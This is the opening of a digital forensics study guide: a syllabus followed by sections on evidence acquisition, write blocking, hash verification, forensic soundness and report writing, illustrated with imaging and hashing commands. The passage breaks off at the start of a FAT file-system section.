# Syllabus

## Module 1: Forensics Fundamentals

- Digital forensics methodology
- Chain of custody concepts
- Evidence acquisition principles
- Write blockers and imaging
- Hash verification (MD5, SHA1, SHA256)
- Forensic soundness principles
- Documentation and reporting

## Module 2: File System Analysis

- FAT12/16/32 structures
- NTFS architecture and artifacts
- ext2/ext3/ext4 structures
- exFAT and ReFS basics
- File system mounting (read-only)
- Deleted file recovery
- File carving techniques
- Slack space analysis
- Alternate Data Streams (ADS)

## Module 3: Disk and Image Analysis

- Raw disk imaging (dd, dcfldd)
- Image formats (E01, AFF, raw)
- Partition table analysis (MBR, GPT)
- Volume analysis
- Disk sector examination
- Bad sector handling
- Virtual disk formats (VMDK, VHD, VHDX)

## Module 4: Memory Forensics

- Memory dump acquisition
- Volatility Framework usage
- Process listing and analysis
- Network connection enumeration
- DLL and handle analysis
- Registry extraction from memory
- Malware memory artifacts
- Kernel module analysis

## Module 5: File Analysis and Metadata

- File signature identification (magic bytes)
- EXIF data extraction
- Document metadata analysis
- File timestamp analysis (MAC times)
- File type verification vs extension
- Compound file formats
- PDF structure analysis
- Office document internals

## Module 6: Network Forensics

- PCAP file analysis
- Wireshark filtering techniques
- Protocol analysis (TCP/IP, HTTP, DNS, FTP)
- Traffic reconstruction
- Network stream extraction
- Malicious traffic patterns
- TLS/SSL analysis basics
- Packet carving

## Module 7: Steganography Detection

- LSB steganography
- Image steganography tools
- Audio steganography
- Text-based hiding techniques
- Steganalysis methods
- Metadata hiding
- File appending/prepending
- Whitespace steganography

## Module 8: Cryptography and Encoding

- Base64/32/16 encoding
- Hex and ASCII conversion
- ROT13 and Caesar ciphers
- XOR operations
- Hash identification
- Common cipher identification
- Password cracking basics
- Archive password recovery

## Module 9: Windows Forensics

- Registry hive analysis
- Windows event logs (EVTX)
- Prefetch file analysis
- ShimCache/AmCache
- Jump lists and recent files
- Windows search index
- USN journal analysis
- Volume Shadow Copies
- Recycle Bin forensics
- LNK file analysis

## Module 10: Linux Forensics

- Linux log file analysis (/var/log)
- Bash history examination
- Cron job artifacts
- User account analysis
- Process accounting
- System service analysis
- Package management logs
- SSH key and configuration analysis

## Module 11: Web and Browser Forensics

- Browser history databases (SQLite)
- Cookie analysis
- Cache extraction
- Session storage forensics
- Local storage examination
- Form autofill data
- Download history
- Browser extension artifacts

## Module 12: Mobile Device Forensics

- Android file system structures
- iOS artifact locations
- SQLite database analysis
- Plist file parsing
- App data extraction
- SMS/MMS recovery
- Call log analysis
- Location data artifacts

## Module 13: Log Analysis

- Syslog format parsing
- Apache/Nginx access logs
- Windows Security/System/Application logs
- Authentication log analysis
- Firewall log examination
- Application-specific logs
- Log correlation techniques
- Timeline creation from logs

## Module 14: Malware Forensics

- Static malware analysis
- String extraction from binaries
- PE file structure analysis
- ELF binary examination
- Packer identification
- IOC extraction
- Behavioral artifact identification
- C2 communication patterns

## Module 15: Email Forensics

- Email header analysis
- MIME structure parsing
- PST/OST file analysis
- MBOX format examination
- EML file parsing
- Email spoofing detection
- Attachment extraction
- Email threading reconstruction

## Module 16: Database Forensics

- SQLite database recovery
- MySQL forensics basics
- PostgreSQL artifact analysis
- Database log examination
- Deleted record recovery
- Write-ahead log (WAL) analysis
- Schema reconstruction

## Module 17: Cloud and Container Forensics

- Cloud storage artifacts
- Container image analysis
- Docker layer examination
- Kubernetes artifact collection
- Cloud service logs
- Virtual machine snapshots
- S3 bucket artifacts

## Module 18: Timeline Analysis

- Super timeline creation
- Log2timeline/Plaso usage
- Event correlation
- Timeline filtering techniques
- Temporal analysis methods
- MFT timeline parsing

## Module 19: Data Recovery

- Deleted file recovery techniques
- Unallocated space analysis
- Journal analysis for recovery
- RAID reconstruction basics
- Corrupted file repair
- Partial file recovery

## Module 20: Anti-Forensics Detection

- Timestomping detection
- Data wiping artifact identification
- Encryption container detection
- Log tampering indicators
- Rootkit artifact detection
- VM/sandbox detection artifacts

## Module 21: Reporting and Documentation

- Evidence documentation standards
- Chain of custody maintenance
- Technical report writing
- Finding presentation
- Screenshot and evidence capture
- Reproducible analysis methods

## Module 22: Kali Linux Forensics Tools

- Autopsy framework
- Sleuth Kit (TSK) utilities
- Foremost file carving
- Scalpel recovery tool
- Binwalk firmware analysis
- ExifTool usage
- Volatility commands
- Wireshark filters
- John the Ripper
- Hashcat basics
- Steghide operations
- outguess usage
- strings command
- xxd hex editor
- file command
- dd imaging
- ewf-tools for E01
- bulk_extractor
- Photorec recovery
- Testdisk partition recovery

---

# Forensics Fundamentals

## Digital Forensics Methodology

Digital forensics follows a structured workflow to ensure evidence integrity and legal admissibility. The standard methodology consists of five phases:

**Identification Phase** Recognize potential evidence sources and determine what data exists. This involves surveying the scene, identifying digital devices, and assessing volatile vs. non-volatile data sources. Document all discovered devices with photographs, serial numbers, and physical condition notes.

**Preservation Phase** Secure evidence to prevent alteration or destruction. Immediately isolate devices from networks, prevent remote wipe capabilities, and maintain power states appropriately. For powered-on systems, capture volatile memory before shutdown. For powered-off systems, maintain that state to preserve data.

**Collection Phase** Acquire data using forensically sound methods that create exact copies without modifying originals. This involves bit-by-bit imaging of storage media, RAM capture, and network traffic collection. Every action must be logged with timestamps and operator details.

**Analysis Phase** Examine collected data to identify relevant artifacts, recover deleted files, parse logs, and reconstruct timelines. Use multiple tools to cross-verify findings and avoid tool-specific artifacts or false positives.

**Presentation Phase** Document findings in clear reports suitable for technical and non-technical audiences. Include methodology, tools used, chain of custody records, findings with supporting evidence, and conclusions based on analysis.

Each phase must be repeatable - another examiner following your documentation should reach identical results.

## Chain of Custody Concepts

Chain of custody is the chronological documentation of evidence handling from seizure through presentation. It proves evidence integrity and admissibility by tracking who handled evidence, when, where, why, and what actions were performed.

**Critical Chain of Custody Elements**

Every transfer or access must document:

- Date and time with timezone
- Identity of person collecting/receiving evidence
- Identity of person transferring evidence
- Purpose of transfer or access
- Location of transfer
- Condition of evidence (sealed, damaged, modified)
- Method of transfer or storage

**Documentation Requirements**

Create a chain of custody form for each piece of evidence containing:

- Unique evidence identifier (case number + item number)
- Description of evidence (make, model, serial number, physical characteristics)
- Location where evidence was collected
- Name and signature of collecting officer
- Subsequent handler names, signatures, dates, and times
- Storage location and access log

**Maintaining Chain Integrity**

Store evidence in secured, access-controlled facilities. Use tamper-evident seals on evidence bags and containers. Log every access to evidence storage areas. When removing evidence for analysis, document start time, return time, and any changes in evidence state.

Breaks in chain of custody can render evidence inadmissible in legal proceedings. If evidence passes through undocumented hands or locations, its integrity becomes questionable.

**Digital-Specific Considerations**

For digital evidence, chain of custody extends to data copies. Document hash values at collection and verification points. Track which forensic workstation accessed which evidence copy. Maintain logs showing write-blocking was active during acquisition.

## Evidence Acquisition Principles

Forensic acquisition creates exact duplicates of digital evidence while preserving the original in unaltered state. Proper acquisition follows strict principles to ensure evidence reliability.

**Order of Volatility**

Collect evidence based on data persistence, from most volatile to least volatile:

1. CPU registers, cache, routing tables
2. RAM contents, running processes, network connections
3. Temporary file systems, swap space
4. Hard disk data
5. Remote logging and monitoring data
6. Physical configuration, network topology
7. Archival media and backups

For live systems, capture volatile memory first before powering down for disk imaging.

**Live vs. Dead Acquisition**

**Live Acquisition** is performed on running systems to capture volatile data unavailable after shutdown. This introduces contamination risk - the acquisition process itself alters system state. Minimize footprint by running tools from external media, not installed on target system. Document all commands executed and their timestamps.

**Dead Acquisition** is performed on powered-off systems or removed storage media. This prevents further system state changes but loses volatile data. Preferred when volatile data is not critical and system can be safely powered down.

**Acquisition Methods**

**Physical Acquisition** creates bit-by-bit copies of entire storage devices including unallocated space, slack space, and hidden areas. Most forensically complete method.

**Logical Acquisition** copies only allocated files and directories visible to operating system. Faster but misses deleted files, unallocated space, and file system metadata.

**Sparse Acquisition** copies only specific files or areas of interest. Used when full acquisition is impractical due to time or storage constraints.

**Forensic Duplication Tools**

Linux `dd` for basic bit-by-bit imaging:

```bash
dd if=/dev/sda of=/mnt/evidence/disk_image.raw bs=4M status=progress conv=noerror,sync
```

Parameters:

- `if=` input file (source device)
- `of=` output file (destination image)
- `bs=` block size (larger values increase speed)
- `status=progress` shows copying progress
- `conv=noerror` continues on read errors
- `conv=sync` pads failed reads with zeros

`dcfldd` enhanced dd with hashing and verification:

```bash
dcfldd if=/dev/sda of=/mnt/evidence/disk_image.raw hash=sha256 hashlog=/mnt/evidence/hash.log bs=4M
```

Additional features:

- Built-in hashing during acquisition
- Multiple output files simultaneously
- Verification passes
- Progress indicators with estimated completion

`dc3dd` another dd enhancement with forensic features:

```bash
dc3dd if=/dev/sda of=/mnt/evidence/disk_image.raw hash=sha256 log=/mnt/evidence/acquisition.log progress=on
```

**ewfacquire** from libewf tools creates Expert Witness Format (E01) images with compression and metadata:

```bash
ewfacquire /dev/sda -t /mnt/evidence/disk_image -C "Case 2024-001" -D "Suspect laptop" -E "John Doe" -e "Examiner Name" -N "Evidence Item 42"
```

E01 format advantages:

- Compression reduces storage requirements
- Embedded metadata (case info, examiner, notes)
- Built-in integrity verification
- Split images for size management
- Industry standard for evidence exchange

**Volatile Memory Acquisition**

`LiME` (Linux Memory Extractor) for RAM capture on Linux:

```bash
sudo insmod lime.ko "path=/mnt/usb/memory.lime format=lime"
```

Formats:

- `lime` - padded format with metadata
- `raw` - straight memory dump
- `padded` - includes physical address information

`avml` (Acquire Volatile Memory for Linux) for rapid acquisition:

```bash
sudo avml /mnt/evidence/memory.dmp
```

`DumpIt` for Windows memory acquisition (run as administrator):

```
DumpIt.exe /O /mnt/evidence/memory.dmp
```

**Network Evidence Acquisition**

`tcpdump` for packet capture:

```bash
tcpdump -i eth0 -w /mnt/evidence/capture.pcap -s 0
```

- `-i` interface to capture
- `-w` write to file
- `-s 0` capture full packet (no truncation)

`Wireshark/tshark` for capture with filtering:

```bash
tshark -i eth0 -w /mnt/evidence/capture.pcap -f "tcp port 80 or tcp port 443"
```

**Remote Acquisition Considerations**

When physically accessing evidence is impossible, remote acquisition may be necessary. This increases contamination and chain of custody complexity. Document:

- Remote access method and authentication
- Network path to target system
- Time synchronization status
- Any automated processes that ran during acquisition
- Complete network traffic logs of acquisition session

## Write Blockers and Imaging

Write blockers prevent any modification to source evidence during acquisition and analysis. They enforce read-only access at hardware or software level, ensuring forensic soundness.

**Hardware Write Blockers**

Physical devices placed between evidence storage and forensic workstation. They intercept write commands at hardware level, allowing only read operations to pass through.

**Types:**

- **SATA/SAS write blockers** - for internal hard drives and SSDs
- **USB write blockers** - for external drives and USB devices
- **IDE/PATA write blockers** - for legacy drives
- **NVMe write blockers** - for modern PCIe SSDs
- **Thunderbolt write blockers** - for Thunderbolt-connected devices

**Connection workflow:**

```
Evidence Drive -> Write Blocker -> Forensic Workstation
```

Hardware write blockers provide strongest protection because they operate below operating system level. The OS cannot bypass hardware enforcement.

**Verification Testing**

Test write blockers regularly to ensure functionality. Standard tests:

- Attempt to create new file on protected device
- Attempt to modify existing file
- Attempt to delete file
- Verify all write operations fail
- Verify read operations succeed
- Document test results with dates

**Software Write Blockers**

Operating system or kernel-level write protection. Less reliable than hardware blockers because sophisticated malware or OS bugs could potentially bypass software controls.

**Linux Software Write Blocking**

Mount devices read-only:

```bash
mount -o ro,noexec,noload /dev/sdb1 /mnt/evidence
```

Parameters:

- `ro` - read-only mount
- `noexec` - prevent execution of binaries
- `noload` - don't load journal on ext3/4 (prevents writes)

For loop devices (mounting image files):

```bash
losetup -r /dev/loop0 /path/to/image.dd
mount -o ro,noexec,noload /dev/loop0 /mnt/evidence
```

Block device write protection:

```bash
blockdev --setro /dev/sdb
```

Verify write-protected status:

```bash
blockdev --getro /dev/sdb
```

Returns `1` if write-protected, `0` if writable.

**Windows Software Write Blocking**

[Unverified] Windows Registry modifications can enable write blocking, but this method is less reliable than hardware blockers or Linux kernel-level protection. Third-party forensic software suites typically implement their own write-blocking mechanisms.

**USB Write Blocking in Linux**

Kernel module `usb-storage` can be loaded with write-protect option:

```bash
modprobe usb-storage quirks=VID:PID:u
```

Replace `VID:PID` with vendor and product IDs from `lsusb`. The `:u` flag enables write protection.

Alternatively, udev rules can automatically write-protect USB devices:

```bash
# /etc/udev/rules.d/10-write-protect.rules
ACTION=="add", SUBSYSTEM=="block", ENV{ID_BUS}=="usb", ATTR{ro}="1"
```

**Imaging Workflow with Write Blockers**

1. Document evidence device (photos, serial numbers, physical condition)
2. Connect evidence device to write blocker
3. Connect write blocker to forensic workstation
4. Verify write blocker is functioning (check indicator lights/status)
5. Verify OS recognizes device as read-only: `blockdev --getro /dev/sdX`
6. Calculate pre-imaging hash
7. Perform acquisition using dd, dcfldd, or ewfacquire
8. Calculate post-imaging hash of source device
9. Calculate hash of created image file
10. Verify all three hashes match
11. Disconnect in reverse order
12. Document completion time and final device state

**Imaging Best Practices**

Always use write blockers when accessing original evidence. Never work directly on evidence media. Create working copies from forensic images, not from original devices. Maintain original evidence in secured storage with documented access control.

Store forensic images on different physical media than source evidence. Use verified storage media formatted with reliable file systems. Calculate hashes before disconnecting evidence to enable verification of acquisition integrity.

Document everything: device details, connection times, imaging commands, hash values, any errors encountered, operator identity, and environmental conditions.

## Hash Verification (MD5, SHA1, SHA256)

Cryptographic hash functions create unique fixed-length fingerprints of data. In forensics, hashes prove data integrity - identical hashes demonstrate data has not been altered between acquisition and analysis.

**Hash Function Properties**

**Deterministic** - same input always produces same hash value

**Fixed Length** - regardless of input size, output is constant length

- MD5: 128 bits (32 hexadecimal characters)
- SHA1: 160 bits (40 hexadecimal characters)
- SHA256: 256 bits (64 hexadecimal characters)

**One-way** - computationally infeasible to reverse hash to original data

**Collision Resistant** - computationally infeasible to find two different inputs producing same hash

**Avalanche Effect** - small input change causes completely different hash output

**MD5 (Message Digest 5)**

Produces 128-bit hash value. Fast computation makes it suitable for large files.

**Security Status:** Cryptographically broken. Collision attacks demonstrated since 2004. Two different files can be crafted to produce identical MD5 hashes. Still used in forensics for legacy compatibility and non-adversarial verification, but should not be sole verification method.

Calculate MD5 in Linux:

```bash
md5sum /mnt/evidence/disk_image.raw
```

Output format:

```
d41d8cd98f00b204e9800998ecf8427e  /mnt/evidence/disk_image.raw
```

Verify against known hash:

```bash
echo "d41d8cd98f00b204e9800998ecf8427e /mnt/evidence/disk_image.raw" | md5sum -c
```

**SHA1 (Secure Hash Algorithm 1)**

Produces 160-bit hash value. Previously standard for integrity verification.

**Security Status:** Considered weak. Collision attacks demonstrated in 2017 (SHAttered attack). Deprecated for cryptographic security but still common in forensics for backward compatibility.

Calculate SHA1 in Linux:

```bash
sha1sum /mnt/evidence/disk_image.raw
```

**SHA256 (SHA-2 Family)**

Produces 256-bit hash value. Current recommended standard for forensic verification.

**Security Status:** No practical collision attacks known. Considered secure for forensic integrity verification. Slower than MD5/SHA1 but computational cost is negligible compared to acquisition time.

Calculate SHA256 in Linux:

```bash
sha256sum /mnt/evidence/disk_image.raw
```

Multiple files simultaneously:

```bash
sha256sum /mnt/evidence/*.raw > /mnt/evidence/hashes.txt
```

Verify multiple files:

```bash
sha256sum -c /mnt/evidence/hashes.txt
```

Output shows OK for matching files, FAILED for mismatches.

**Hash Calculation Tools**

**Linux command-line tools:**

```bash
md5sum file.img
sha1sum file.img
sha256sum file.img
sha512sum file.img
```

**Combined hashing during imaging with dcfldd:**

```bash
dcfldd if=/dev/sda of=/mnt/evidence/disk.raw hash=md5,sha256 hashlog=/mnt/evidence/hashes.log bs=4M
```

Calculates multiple hash algorithms simultaneously during acquisition, saving time.

**hashdeep for recursive hashing:**

```bash
hashdeep -r -c md5,sha256 /mnt/evidence/ > /mnt/evidence/manifest.txt
```

Creates manifest of all files with multiple hash values. Useful for verifying entire directory structures.

Audit mode to detect changes:

```bash
hashdeep -r -c md5,sha256 -a -k /mnt/evidence/manifest.txt /mnt/evidence/
```

Reports any files with changed hashes, new files, or missing files.

**Windows hash tools:**

`certutil` built-in utility:

```
certutil -hashfile disk_image.raw MD5
certutil -hashfile disk_image.raw SHA256
```

**Forensic Hash Workflow**

1. **Pre-Acquisition Hash** - Calculate hash of source device before imaging. This establishes baseline of original evidence state.

```bash
sha256sum /dev/sda > source_hash.txt
```

2. **Post-Acquisition Source Hash** - Recalculate hash of source device after imaging completes. Should match pre-acquisition hash, proving source was not modified during imaging.

```bash
sha256sum /dev/sda >> source_hash.txt
```

3. **Image File Hash** - Calculate hash of created image file. Should match source device hashes, proving image is exact copy.

```bash
sha256sum /mnt/evidence/disk_image.raw >> source_hash.txt
```

4. **Verification Hash** - Before beginning analysis, recalculate image hash. Should match acquisition hash, proving image was not altered during storage or transport.
    
5. **Working Copy Hash** - When creating working copies from forensic image, calculate hashes to verify copy integrity.
    

**Hash Verification Documentation**

Record in evidence log:

- Hash algorithm used (preferably SHA256)
- Hash value
- Timestamp of calculation
- File or device hashed
- Tool and version used
- Operator who performed calculation

Example documentation:

```
Evidence: Suspect laptop hard drive
Device: /dev/sda (Western Digital WD5000AAKX 500GB)
Hash Algorithm: SHA256
Pre-Acquisition Hash: 7a79c3a3d5f2a1b8e6d4c9f8e3a2b5d6c8f1a3e5b7d9c2a4f6e8b1d3c5a7e9f1b3
Calculated: 2024-10-12 14:32:18 UTC
Tool: sha256sum (GNU coreutils 8.32)
Operator: Forensic Examiner #42

Image File: /mnt/evidence/case2024-001_laptop_hdd.raw
Image Hash: 7a79c3a3d5f2a1b8e6d4c9f8e3a2b5d6c8f1a3e5b7d9c2a4f6e8b1d3c5a7e9f1b3
Calculated: 2024-10-12 15:47:52 UTC
Tool: sha256sum (GNU coreutils 8.32)
Operator: Forensic Examiner #42

Verification: MATCH - Image is exact copy of source
```

**Hash Mismatch Handling**

If hashes do not match, evidence integrity is compromised. Document the mismatch immediately with:

- Expected hash value
- Calculated hash value
- When mismatch was discovered
- What may have caused alteration

Investigate causes:

- Hardware failure during acquisition
- Faulty write blocker
- Corrupt storage media
- Transmission errors if image was transferred
- Intentional tampering

Re-acquire evidence if possible. If not possible, document why original acquisition failed and what steps were taken in second attempt.

## Forensic Soundness Principles

Forensic soundness ensures examination methodology produces reliable, repeatable, and legally admissible results. Forensically sound procedures maintain evidence integrity and withstand scrutiny.

**Core Principles of Forensic Soundness**

**Preservation of Original Evidence**

Never work directly on original evidence. All analysis must be performed on verified copies. Original evidence must remain in pristine condition for potential re-examination or independent verification.

Write blockers must be used for all access to original evidence. Document every instance of evidence access, even for hash calculation or brief examination.

**Repeatability**

Another qualified examiner following identical methodology should reach identical conclusions. This requires comprehensive documentation of every action, tool, and parameter.

Tools must produce consistent results. Verify tool reliability by testing on known data sets before applying to case evidence.

**Documentation of Methodology**

Record every step of examination process:

- Tools used with version numbers
- Commands executed with full parameters
- Time and date of each action
- Results obtained from each operation
- Reasoning behind analytical decisions

**Verification and Validation**

Cross-verify findings using multiple tools when possible. Single-tool reliance risks tool-specific bugs or artifacts.

Validate tool functionality on test data before using on case evidence. Maintain reference data sets with known characteristics.

**Minimizing Contamination**

Every action modifies something - even read operations update access times. Minimize unavoidable contamination and document all modifications.

For live system analysis, use tools that minimize footprint. Run from external media rather than installing on target system. Document what processes were started and what files were accessed.

**Maintaining Chain of Custody**

Track evidence from seizure through analysis to reporting. Every transfer, access, and storage location must be documented.

**Forensically Sound Acquisition**

Use bit-by-bit imaging that captures:

- Allocated files and directories
- Deleted file remnants in unallocated space
- File system metadata
- Slack space within allocated files
- Host protected areas and device configuration areas

Calculate cryptographic hashes before and after acquisition to prove exact duplication.

**Forensically Sound Analysis Environment**

**Isolated Forensic Workstation** prevents evidence from being contaminated by network traffic, malware, or external connections. Disable network interfaces during analysis. Use dedicated hardware that never connects to production networks.

**Sanitized Tools** use forensic tool distributions built for evidence examination. Standard OS installations may have services that automatically modify files (indexing, antivirus, thumbnail generation).

**Write Protection** mount evidence as read-only. Use software write blocking or mount via loop devices with explicit read-only flags.

```bash
mount -o ro,noexec,noload,noatime /dev/loop0 /mnt/evidence
```

`noatime` prevents updating access time stamps even on read operations.

**Working Copies** create working copies from verified forensic image. Perform experimental or potentially destructive analysis on working copies only. Original forensic image remains pristine.

**Forensically Sound Tool Usage**

**Validated Tools** use well-established forensic tools with documented reliability. Open source tools allow examination of methodology. Proprietary tools should have documented validation testing.

**Known Limitations** understand tool limitations and potential for false positives/negatives. No tool is perfect - cross-verification catches tool-specific issues.

**Tool Documentation** record exact tool versions used. Tool updates may change behavior or fix bugs. Future re-examination should use same tool versions or account for differences.

**Forensic Soundness vs. Anti-Forensics**

Adversaries may employ anti-forensic techniques:

- Timestamp modification
- Secure deletion tools
- Encryption
- Steganography
- File system manipulation
- Evidence destruction

Forensically sound methodology must detect anti-forensic activities. Document evidence of anti-forensic tool usage as this demonstrates adversary consciousness of guilt and technical sophistication.

**Legal and Ethical Considerations**

Evidence must be obtained legally with proper authorization. Warrants, consent forms, or other legal authority must exist before evidence seizure.

Examiner qualifications matter. Training, certifications, and experience establish credibility. Courts may challenge unqualified examiners' findings.

Maintain objectivity. Report findings accurately regardless of which party they favor. Confirmation bias can lead to missing exculpatory evidence.

**Forensic Soundness Checklist**

Before beginning examination:

- [ ] Original evidence secured with documented chain of custody
- [ ] Write blocker tested and functioning
- [ ] Forensic workstation isolated and configured properly
- [ ] Tools validated and versions documented
- [ ] Legal authorization to examine evidence confirmed

During acquisition:

- [ ] Pre-acquisition hash calculated and recorded
- [ ] Acquisition performed with write blocker active
- [ ] Acquisition logged with timestamps and operator ID
- [ ] Post-acquisition source hash matches pre-acquisition hash
- [ ] Image file hash matches source hash
- [ ] Acquisition errors documented if any occurred

During analysis:

- [ ] Working on verified copy, not original image
- [ ] Evidence mounted read-only
- [ ] All commands and tools logged
- [ ] Findings documented with supporting evidence
- [ ] Alternative explanations considered
- [ ] Cross-verification performed where possible

After analysis:

- [ ] Original evidence returned to secure storage unchanged
- [ ] All analysis artifacts retained for peer review
- [ ] Complete report documents methodology and findings
- [ ] Chain of custody maintained through completion

## Documentation and Reporting

Comprehensive documentation transforms technical findings into evidence that withstands legal scrutiny. Reports must communicate complex technical details to both expert and lay audiences while providing sufficient detail for peer verification.

**Documentation During Examination**

**Real-Time Logging**

Record actions as they occur, not from memory afterward. Include:

- Exact commands executed with full parameter strings
- Time and date stamps for each action
- Results obtained including error messages
- Files created, modified, or accessed
- Changes to system state

Use terminal logging to capture complete session:

```bash
script -t 2>timing.log -a output.log
```

This creates complete transcript of terminal session with timing information for replay:

```bash
scriptreplay -t timing.log -s output.log
```

**Photo Documentation**

Photograph evidence in original location before collection. Include:

- Overall scene showing device context
- Device connections (cables, peripherals, network connections)
- Screen display if powered on
- Physical condition and damage
- Serial numbers and identifying marks
- Close-ups of ports and labels

Use ruler or scale reference in photos. Include photo log with date, time, photographer, and description of each image.

**Evidence Tracking**

Maintain spreadsheet or database tracking:

- Unique evidence identifier
- Description and source
- Date/time collected
- Collected by whom
- Current location
- Hash values
- Related case number
- Current status (secured, under analysis, returned)

**Analysis Notes**

Document analytical reasoning:

- Why specific tools were chosen
- What hypotheses were tested
- What results were expected vs. obtained
- How findings relate to case questions
- What alternative explanations exist

**Forensic Report Structure**

**Executive Summary**

Non-technical overview for decision-makers. Summarize key findings, conclusions, and significance. Avoid technical jargon. One to two pages maximum.

Example: "Examination of the suspect laptop revealed deleted internet history showing visits to the target company's internal file server on the date of the data breach. Recovered documents in the laptop's recycle bin matched files reported stolen by the victim company. Timeline analysis shows these files were deleted two days after the suspect's employment termination."

**Case Information**

- Case number and title
- Requesting party and contact information
- Date of request
- Date analysis began and completed
- Examiner name and qualifications
- Evidence items examined

**Objective**

State what questions examination sought to answer. List specific tasks requested:

- Determine if device accessed specific websites
- Recover deleted communications
- Establish timeline of user activities
- Identify installed hacking tools
- Locate specific documents

**Evidence Description**

For each evidence item:

- Unique identifier
- Physical description (make, model, serial number, capacity)
- Condition when received
- Hash values (algorithm and hash)
- Chain of custody summary

**Examination Environment**

Document analysis setup:

- Forensic workstation specifications
- Operating system and version
- Tools used with version numbers
- Write blocking method
- Any forensic distributions used (SIFT, DEFT, CAINE, Paladin)

Example:

```
Analysis Platform: Dell Precision 7920
CPU: Intel Xeon Gold 6248, RAM: 128GB
OS: Ubuntu 22.04 LTS with SIFT Workstation 2024
Tools: Autopsy 4.21.0, Sleuth Kit 4.12.1, Volatility 3.2.0
Write Blocking: Tableau T8-R2 Hardware Write Blocker
```

**Methodology**

Detailed explanation of examination process. Break into phases:

**Acquisition Phase:**

- Device received condition
- Write blocker connection
- Imaging tool and parameters
- Verification process
- Acquisition timeline

**Analysis Phase:**

- Mounting and preparation
- File system examination approach
- Keyword searches performed
- Artifact locations examined
- Data recovery techniques
- Timeline reconstruction method

**Findings**

Present discoveries organized by significance or chronologically. Each finding should include:

**Finding description** - what was discovered

**Location** - where artifact was found (file path, sector offset, memory address)

**Timestamp** - when artifact was created/modified/accessed

**Significance** - relevance to case objectives

**Supporting evidence** - screenshots, hex dumps, log excerpts

**Tool and methodology** - how finding was obtained

Example finding:

```
Finding 3: Deleted Word Document "client_list_2024.docx"

Location: /Users/jsmith/Documents/
File System Entry: Deleted, inode 284619
Recovery Method: Carved from unallocated space using foremost
File Size: 84,237 bytes
Created: 2024-09-15 14:22:33 UTC
Modified: 2024-09-18 16:45:12 UTC  
Deleted: 2024-09-20 09:15:45 UTC (inferred from parent directory mtime)
Hash: SHA256 7f3b8a9c... (full hash in appendix)

Significance: Document contains client contact information matching victim company's reported stolen data. Modification date corresponds to date of alleged data breach. Deletion occurred two days after suspect's termination.

Content Summary: Spreadsheet data embedded in Word document listing 247 client names, email addresses, and contract values. Formatting consistent with victim company's standard templates.
```

**Screenshots and Evidence Exhibits**

Include screenshots showing:

- Artifact in original context
- Tool output displaying finding
- Relevant metadata
- Hex dumps for file headers or critical data
- Timeline views showing event sequences

Number all exhibits and reference them in report body. Maintain high resolution - text must be readable.

**Timeline Analysis**

Chronological presentation of system activities relevant to investigation. Use standardized timestamp format with explicit timezone.

Example timeline excerpt:

```
2024-09-15 14:22:33 UTC | Created: client_list_2024.docx
2024-09-15 14:23:15 UTC | USB device connected (VID:PID 0951:1666)
2024-09-15 14:24:02 UTC | File copied to USB: client_list_2024.docx
2024-09-15 14:25:18 UTC | USB device ejected
2024-09-18 16:45:12 UTC | Modified: client_list_2024.docx
2024-09-20 09:15:45 UTC | Deleted: client_list_2024.docx
```

**Conclusions**

Summarize findings in relation to case objectives. State what evidence supports, what remains unanswered, and what alternative explanations exist.

Avoid overstating certainty. Use appropriate qualifiers:

- "Evidence indicates..." rather than "Evidence proves..."
- "Consistent with..." rather than "Definitively shows..."
- "Most likely explanation..." rather than "Only possible explanation..."

Example conclusion: "Examination revealed deleted documents matching victim company's stolen data. Timeline analysis shows these documents were modified during the alleged breach period and subsequently deleted after suspect's termination. Evidence is consistent with hypothesis that suspect accessed and retained confidential company information, though alternative explanations cannot be completely excluded."

**Limitations**

Acknowledge constraints and uncertainties:

- Encrypted volumes not accessible
- Damaged media preventing complete recovery
- Anti-forensic tool usage detected
- Time constraints limiting scope
- Technical limitations of tools used

Example limitation statement: "The suspect laptop's secondary drive was encrypted with BitLocker and could not be accessed without the recovery key. Contents of this encrypted volume remain unknown and may contain additional relevant evidence."

**Appendices**

Include supporting technical details:

- Complete hash lists
- Tool output logs
- Full file listings
- Detailed technical procedures
- Glossary of technical terms
- Examiner CV and qualifications

**Report Quality Standards**

**Accuracy** - verify all technical details. Double-check file paths, timestamps, hash values, and tool versions. Errors undermine credibility.

**Clarity** - write for your audience. Executive summary uses plain language. Technical sections can include specialized terminology but should define terms.

**Completeness** - address all requested objectives. If something couldn't be determined, explain why. Don't leave questions unanswered without explanation.

**Objectivity** - report facts without bias. Include findings that support and contradict different theories. Acknowledge uncertainties.

**Reproducibility** - another examiner should be able to verify findings using your documentation. Include sufficient detail to reproduce analysis.

**Chain of Custody Documentation**

Report must include chain of custody records showing:

- Evidence acquisition
- Transport and storage
- Analysis access
- Return to storage
- No gaps in accountability

**Peer Review**

Before finalizing report, technical peer review by another qualified examiner catches errors and validates methodology. Review should verify:

- Technical accuracy
- Methodology soundness
- Conclusion support
- Alternative explanation consideration

**Report Security**

Forensic reports contain sensitive information. Protect with:

- Encryption for electronic storage and transmission
- Access controls limiting distribution
- Watermarking to track unauthorized copies
- Secure destruction of drafts and working notes

**Testimony Preparation**

Report may lead to testimony. Prepare by:

- Reviewing report thoroughly before testimony
- Anticipating challenges to methodology
- Preparing plain-language explanations of technical findings
- Having backup documentation readily accessible
- Understanding scope of expertise - don't opine beyond qualifications

---

**Related Critical Topics:** File System Forensics (NTFS, ext4, APFS), Memory Forensics Fundamentals, Timeline Analysis Techniques, Anti-Forensics Detection

---

# File System Analysis

## FAT12/16/32 Structures

FAT (File Allocation Table) file systems use a straightforward allocation method where files are tracked through linked chains in a table. Understanding the structure is critical for recovering deleted files and identifying file artifacts in CTF scenarios.

### Boot Sector and BPB

The boot sector (first 512 bytes) contains the BIOS Parameter Block (BPB), which defines the file system layout. Key fields include:

- Bytes per sector (typically 512)
- Sectors per cluster (determines minimum allocation unit)
- Number of reserved sectors (boot code area)
- Number of FATs (usually 2 for redundancy)
- Root directory entries (FAT12/16 only; FAT32 uses dynamic allocation)
- Total sectors in the file system
- Sectors per track and number of heads

Extract and examine the boot sector:

```bash
xxd -l 512 /dev/sdX1 | head -20
# Or with specific byte ranges
hexdump -C -n 512 /dev/sdX1 | head -30
```

Use `fsck.vfat` or dedicated forensic tools to parse BPB fields programmatically:

```bash
fdisk -l /dev/sdX # Shows partition info including sector counts
```

### FAT Chain Traversal

Files are stored as clusters linked through the FAT. Each FAT entry points to the next cluster, with special values indicating end-of-file (EOF) or bad clusters. In FAT12, each entry is 12 bits; FAT16 uses 16 bits; FAT32 uses 32 bits (with upper 4 bits reserved).

Traverse a file's chain manually using hexdump:

```bash
